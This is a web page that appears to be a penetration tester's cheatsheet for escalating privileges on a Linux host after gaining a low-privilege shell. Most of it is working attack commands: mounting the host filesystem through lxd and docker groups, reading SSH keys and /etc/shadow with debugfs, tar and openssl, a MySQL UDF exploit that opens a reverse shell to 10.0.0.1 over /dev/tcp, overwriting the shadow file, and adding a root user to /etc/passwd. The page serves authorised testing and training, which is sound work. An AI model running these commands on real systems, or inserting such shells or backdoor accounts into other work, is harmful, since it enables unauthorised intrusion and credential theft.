---
layout: page
title: Linux privilege escalation cheatsheet
description: Linux privilege escalation cheatsheet
dropdown: Cheatsheets
priority: 1
---

If you landed on this page, it probably means that you have a low privilege shell on a target you were allowed to attack and are looking to escalate your privileges. If this is the case, good for you :) Let's enjoy the shell excitement before enumerating the target all over again!

Before we start, I would like to point out that this is a mere collection of the things I look for once I gain access to a target. It does not make me an expert. It's just a basic guide that I hope you will find useful.

## User enumeration

**Who am I running as? Can I run sudo?**

```console
#id
#whoami
#sudo -l
```

**What are the last commands executed on the system?**

If available, the user's history can contain valuable hints and possibly sensitive information such as the user's credentials.

```console
#history
```

**Are there any other users on the system?**

```console
#cat /etc/passwd
```

**Do I belong to an interesting group ?**

```console
#groups
```

### Interesting groups to look for

+ **lxc/lxd group**

On your attacking machine, build the latest Alpine image by running the below commands as root:

```console
#git clone  https://github.com/saghul/lxd-alpine-builder.git
#cd lxd-alpine-builder
#./build-alpine
```

Transfer the Alpine image to the target machine and run the following commands:

```console
#lxc image import ./apline.tar.gz --alias myimage
```

You can check the list of images by running:

```console
#lxc image list
```

```console
#lxc init myimage ignite -c security.privileged=true
#lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
#lxc start ignite
#lxc exec ignite /bin/sh
#id
#cd /mnt/root
```

The target filesystem can be accessed by navigating to /mnt/root.

+ **Docker group**

On the target machine run the below command:

```console
#docker run -v /:/mnt -i -t alpine
```

+ **Video Group**

This is only interesting if there are other users logged in to the system. By being in the video group, you can control access to the graphical output devices. The screen output is stored in the [framebuffer](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt), which can be dumped to disk and converted to an image.

To check if there are other users logged in to the system, you can run the *w* command.

If an other user is logged in to the system, it's your lucky day. The first step is to capture the framebuffer raw data on the board:

```console
#cat /dev/fb0 > /tmp/screen.raw
```

The second step is to convert the framebuffer screenshot into an image. To do so, you can either use the below [script](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/) or [Gimp](https://www.gimp.org/).

```console
#!/usr/bin/perl -w

$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;

open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";

printf OUT "P6%d %d\n255\n", $w, $h;

while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}

close OUT;
```

```console
#width=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f1)
#height=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2)
#./raw2png $width $height < /tmp/screen.raw > /tmp/screen.png
```

+ **adm group**

The admin group or adm allows the user to read log files located under /var/log. By reading log files we can potentially access sensitive informations such as user actions and hidden cron-jobs.

+ **disk group**

If you belong to this group, you have read access to the whole filesystem. You can also modify any file that is not owned by the root user.

```console
#debugfs /dev/sda1
#debugfs: cd /root
#debugfs: cat /root/.ssh/id_rsa
#debugfs: cat /etc/shadow
```

## Operating system enumeration

**What is the kernel's version? What is the architecture? Is it vulnerable to known Kernel exploits? Which kernel modules are loaded? Which libc version is the targer running? Is it vulnerable to [CVE-2010-3856](https://nvd.nist.gov/vuln/detail/CVE-2010-3856)**

```console
#cat /etc/issue
#uname -a
#lsmod
#cat /proc/modules
```

If you notice an interesting kernel module, you can use *modinfo* to have more information about it.

```console
#modinfo interesting-module-name
```

```console
#/lib/libc.so.6 --version
```

In general, if the kernel release date is recent; there is no need to waste time looking for kernel exploits. If the Kernel is pretty old, chances are it is vulnerable to a kernel exploit and you should investigate this vector further. Kernel exploits can be found in [exploit-db](https://www.exploit-db.com/).

## Process enumeration  

**Is there a process running with unnecessary root permissions?**

```console
#ps aux
#ps aux | grep root
```

### Examples of processes to look for

The idea here is to hijack a process running as root.

+ **mysql**

We can use [MySQL UDF Dynamic Library](https://www.exploit-db.com/exploits/1518) to get root on the system.

```console
#gcc -g -c raptor_udf2.c
#gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('bash -i >& /dev/tcp/10.0.0.1/443 0>&1');
```

Before running the last command, you will need to set up a Netcat listener on your attacking machine.

## Network Enumeration

**Is there an interesting service listening locally? Which ports are open?**

```console
#ifconfig
#netstat -ano
#netstat -antp
```

Using the Netstat command, we can see all the listening ports. We can also determine if other users are connected to the target by observing the established connections list.


<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Tip:</h3>
      </div>
      <div class="panel-body">
If you need to attack a local service (listening for connections from the localhost) and the tools you need are not installed on the target, you can do a local port forwarding to your machine.

   </div>
    </div>

### Local port forwarding techniques

```console
#ssh -L 4000:127.0.0.1:3306 root@kali
```

I also recommend using [chisel](https://github.com/jpillora/chisel) to do local port forwarding.

## Cron jobs and scheduled tasks enumeration

**Is there any cron job running as root?**

```console
#ls -lah /etc/cron*
#cat /etc/crontab
```

The idea here is to inspect scheduled tasks for insecure file permissions. For instance, if a script is running every couple of minutes as root and you can modify its contents, you can basically run any command as root.
If you don't have write permission to the script, it does not mean it's over. Try to understand what the script is doing. Perhaps you have write access to a binary it's calling?
Reverse engineering the binary is the way to go here. You can use [Ghidra](https://github.com/NationalSecurityAgency/ghidra).

You can also use [pspy](https://github.com/DominicBreuker/pspy); a tool designed to show you commands run by other users and cron jobs as they execute.

[Ippsec](https://ippsec.rocks/) has created the below process monitor bash script in one of his videos to check cron jobs.

```console
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

## Installed applications and packages enumeration

**Which packages are installed? Which versions are they running? Are they vulnerable to known issues?**

```console
#dpkg -l #Debian
#rpm -qa #Centos
#dpkg -s {package-name-here}
#dpkg -s {package-name-here} | grep -i version
```

## SUID binaries enumeration

**Can we abuse SUID programs?**

```console
#find / -perm -u=s -type f 2>/dev/null
```

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
When we run an executable, it inherits the permissions of the user we are running as. However, if the binary has the setuid bit enabled, it will run under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. In some cases, this is actually needed. As an example, we wouldn't be able to execute basic commands like ping without the setuid bit. In other cases, binaries with the suid bit can be exploited in order to gain root permissions. As an example, if cp or cat were SUID, we would be able to copy, overwrite and read sensitive files.

   </div>
    </div>

This [GTFOBins](https://gtfobins.github.io/#+suid) contains a list of binaries we can exploit if they were SUID.

There is also a [python script](https://github.com/Anon-Exploiter/SUID3NUM) that automatically finds SUID bins, separates default bins from custom bins and cross-match those with bins in GTFO Bin's repository.

## Capabilities enumeration

**Which capabilities are enabled?**

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
As described in <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux capabilities man page</a>; For the purpose of performing permission checks, traditional UNIX
       implementations distinguish two categories of processes: privileged
       processes (whose effective user ID is 0, referred to as superuser or
       root), and unprivileged processes (whose effective UID is nonzero).
       Privileged processes bypass all kernel permission checks, while
       unprivileged processes are subject to full permission checking based
       on the process's credentials (usually: effective UID, effective GID,
       and supplementary group list).
       Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities,
       which can be independently enabled and disabled. The idea is to divide all the possible privileged kernel calls into groups of related functionality. Since only the necessary subset of capabilities are assigned to an executable; in case of successful exploitation; an attacker would only gain access to the assigned subset of capabilities and not the entire system.
   </div>
    </div>

In order to identify programs in a system or folder with capabilities, we can use the *getcap* command.

```console
#getcap -r / 2>/dev/null
```

To summarise, if you find a binary that:

1. Is not owned by root.
2. Has no SUID/SGID bits set.
3. Has empty capabilities set (e.g.: getcap program returns myelf =ep)

Then that binary will run as root.

### Classic examples

1. *Openssl*

```console
#getcap -r / 2>/dev/null
#/home/user/openssl =ep
#cd /tmp
#openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
#openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
#curl -k "https://127.0.0.1:1337/etc/shadow"
root:$6$saltsalt$HOC6AvLVkxCTYnJ5Tc78.CYF/KdcBDmheMbOGQTqiMUZhdKof7eXjN9/6I3w8smybsEQEaz5Vh8aoGGs71hf20:17673:0:99999:7:::
bin:*:17632:0:99999:7:::
daemon:*:17632:0:99999:7:::
```

We can also create a new shadow file.

```console
#/tmp/shadow.custom #shadow file with the modified root password
#openssl smime -encrypt -aes256 -in /tmp/shadow.custom -binary -outform DER -out /tmp/shadow.custom.enc /tmp/cert.pem
#openssl smime -decrypt -in /tmp/shadow.custom -inform DER -inkey /tmp/key.pem -out /etc/shadow
```

2.*Tar*

```console
#getcap -r 2>/dev/null
#tar = cap_dac_read_search+ep
```

This means that tar has read access to everything. We can use it to archive any sensitive file in the filesystem.

```console
#tar -cvf shadow.tar /etc/shadow
#tar -xvf shadow.tar
#cat etc/shadow
```

If you are not sure whether a capability is exploitable or not, you can search for the binary on [GTFObins](https://gtfobins.github.io/#+capabilities).

## Sensitive file permissions enumeration

**Can we modify sensitive files?**

### Classic examples

1. *Write access to the /etc/passwd file*

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
Linux password hashes are generally stored in the /etc/shadow file. This file is only readable by the root user. 
/etc/passwd file only contains users account details and is readable by everyone. 
Historically however, users password hashes were stored in the /etc/passwd file. For backwards compatibility, if a password hash is present in the /etc/passwd, it is considered valid for authentication and any entry in /etc/shadow for that user will be ignored. 	
   </div>
    </div>

If we have write access to the /etc/passwd file, we can create a new user root.

```console
#openssl passwd hacked
#8kfhJyVOSM93c
#echo "hacker:8kfhJyVOSM93c:root:/root:/bin/bash" >>/etc/passwd
#su hacker
Password: hacked
```

## Automated scripts

1. [LinEnum.sh](https://github.com/rebootuser/LinEnum)
2. [LinuxPrivChecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
3. [Linux-Exploit-Suggester-2.pl](https://github.com/jondonas/linux-exploit-suggester-2)
4. [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### References & Further readings

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
* [https://fosterelli.co/privilege-escalation-via-docker.html](https://fosterelli.co/privilege-escalation-via-docker.html)
* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe)
* [https://www.hackingarticles.in/docker-privilege-escalation/](https://www.hackingarticles.in/docker-privilege-escalation/)
* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/](https://book.hacktricks.xyz/linux-unix/privilege-escalation/)
* [https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html](https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html)
